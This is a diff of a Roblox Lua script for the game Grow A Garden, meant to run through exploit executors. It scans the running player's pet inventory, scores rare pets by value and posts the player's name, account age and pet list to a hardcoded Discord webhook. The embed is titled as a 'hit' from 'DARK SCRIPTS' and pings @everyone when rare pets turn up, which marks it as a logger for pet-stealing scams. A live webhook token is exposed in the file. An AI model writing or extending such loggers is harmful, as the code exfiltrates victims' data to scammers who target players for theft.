@@ -1,10 +1,7 @@
--- In-Game Pet Inventory → Discord Webhook (Exploit Ready)
-
 local player = game.Players.LocalPlayer
 
 -- === CONFIG ===
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1410488907358933063/unmfmZmJVyaxMnj7Pbw-_U5q4J7zlLvC4xwxwgRGvHrWKH0yVRHF8-em1KJJ6DbSkiqU"
--- ==============
 
 -- Priority pets → emojis
 local PRIORITY = {
@@ -16,6 +13,18 @@ local PRIORITY = {
     ["Queen Bee"] = "👑🐝",
     ["Lobster Thermidor"] = "🦞",
     ["Golden Goose"] = "🥇🦢"
+}
+
+-- Priority pets → base values
+local PRIORITY_VALUES = {
+    ["Raccoon"] = 250,
+    ["Dragonfly"] = 50,
+    ["Mimic Octopus"] = 30,
+    ["Red Fox"] = 10,
+    ["Disco Bee"] = 200,
+    ["Queen Bee"] = 20,
+    ["Lobster Thermidor"] = 30,
+    ["Golden Goose"] = 15
 }
 
 -- Allowed pets
@@ -35,29 +44,23 @@ local PETS = {
     "Red Fox","Dragonfly","Disco Bee","Queen Bee","Lobster Thermidor","Golden Goose"
 }
 
--- Lowercased keywords for detection
+-- Prepare lowercase keywords
 local PET_KEYWORDS = {}
 for _, name in ipairs(PETS) do
     PET_KEYWORDS[#PET_KEYWORDS+1] = name:lower()
 end
 
--- Helper: check if name is in allowed list
 local function isPet(name)
     local lower = name:lower()
     for _, keyword in ipairs(PET_KEYWORDS) do
-        if string.find(lower, keyword) then
-            return true
-        end
+        if string.find(lower, keyword) then return true end
     end
     return false
 end
 
--- Helper: check if name is priority and return emoji if true
 local function getPriorityEmoji(name)
     for petName, emoji in pairs(PRIORITY) do
-        if string.find(name:lower(), petName:lower()) then
-            return emoji
-        end
+        if string.find(name:lower(), petName:lower()) then return emoji end
     end
     return nil
 end
@@ -65,7 +68,7 @@ end
 -- Collect pets from a container
 local function collectPets(container)
     local items = {}
-    if not container then return items end
+    if not container then return items, 0, 0 end
     for _, obj in ipairs(container:GetChildren()) do
         if obj:IsA("Tool") and isPet(obj.Name) then
             table.insert(items, obj.Name)
@@ -73,13 +76,42 @@ local function collectPets(container)
     end
 
     local priorityItems, normalItems = {}, {}
+    local totalValue = 0
+
     for _, name in ipairs(items) do
         local emoji = getPriorityEmoji(name)
-        if emoji then
-            table.insert(priorityItems, emoji .. " " .. name:lower())
-        else
-            table.insert(normalItems, "🐶 " .. name)
+        local baseValue = 0
+        for petName, petValue in pairs(PRIORITY_VALUES) do
+            if string.find(string.lower(name), string.lower(petName)) then
+                baseValue = petValue
+                break
+            end
         end
+
+        local displayName = name
+        local value = baseValue
+
+        if emoji then
+            -- True priority pets
+            if baseValue >= 50 then
+                displayName = "Titanic " .. name
+                value = value + 2000
+            elseif baseValue >= 30 then
+                displayName = "Huge " .. name
+                value = value + 1000
+            end
+            table.insert(priorityItems, emoji .. " " .. displayName .. " (Value: " .. baseValue .. ")")
+        else
+            -- Non-priority pets: 30+kg show 💪 but no ping
+            if baseValue >= 30 then
+                displayName = "💪 " .. name
+            else
+                displayName = "🐶 " .. name
+            end
+            table.insert(normalItems, displayName)
+        end
+
+        totalValue = totalValue + value
     end
 
     table.sort(priorityItems, function(a,b) return a:lower()<b:lower() end)
@@ -89,55 +121,53 @@ local function collectPets(container)
     for _,n in ipairs(priorityItems) do table.insert(ordered,n) end
     for _,n in ipairs(normalItems) do table.insert(ordered,n) end
 
-    return ordered, #priorityItems > 0
+    return ordered, #priorityItems > 0, totalValue
 end
 
--- Collect from Backpack + Equipped
-local backpack, hasPriorityBackpack = collectPets(player:FindFirstChild("Backpack"))
-local equipped, hasPriorityEquipped = collectPets(player.Character)
+-- Collect pets from Backpack and Equipped
+local backpack, hasPriorityBackpack, backpackValue = collectPets(player:FindFirstChild("Backpack"))
+local equipped, hasPriorityEquipped, equippedValue = collectPets(player.Character)
 
--- Format section
-local function section(name, list)
-    if #list == 0 then
-        return "**" .. name .. ":**\nNo pets found."
-    else
-        return "**" .. name .. ":**\n" .. table.concat(list, "\n")
-    end
-end
+local totalValue = backpackValue + equippedValue
 
 -- Build Discord embed
 local description = table.concat({
-    "Username: " .. player.Name,
-    "UserId: " .. player.UserId,
+    "Player Information",
+    "Name: " .. player.Name,
+    "Executor: Delta",
+    "Account Age: " .. player.AccountAge .. " days",
     "",
-    section("Backpack Pets", backpack),
-    section("Equipped Pets", equipped),
-}, "\n\n")
+    "Total Value: 💰 " .. totalValue,
+    "",
+    "Backpack",
+    #backpack > 0 and table.concat(backpack, "\n") or "No pets found."
+}, "\n")
 
--- Check if any priority pet exists
+-- Only real priority pets trigger ping
 local hasPriority = hasPriorityBackpack or hasPriorityEquipped
 local ping = hasPriority and "@everyone" or ""
 
 local payload = {
-    content = ping .. " **Pet Inventory Log**",
+    content = ping,
     embeds = {{
-        title = "Pet Snapshot",
+        title = "🌵 Grow A Garden Hit - DARK SCRIPTS 🍀",
         description = description,
-        color = hasPriority and 15158332 or 3447003 -- red if priority, blue if normal
+        color = hasPriority and 15158332 or 3447003
     }}
 }
 
 local json = game:GetService("HttpService"):JSONEncode(payload)
 
--- Send webhook
 local req = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (krnl and krnl.request)
 if req then
-    req({
-        Url = WEBHOOK_URL,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = json
-    })
+    pcall(function()
+        req({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = json
+        })
+    end)
 else
     warn("❌ Your executor does not support HTTP requests.")
 end
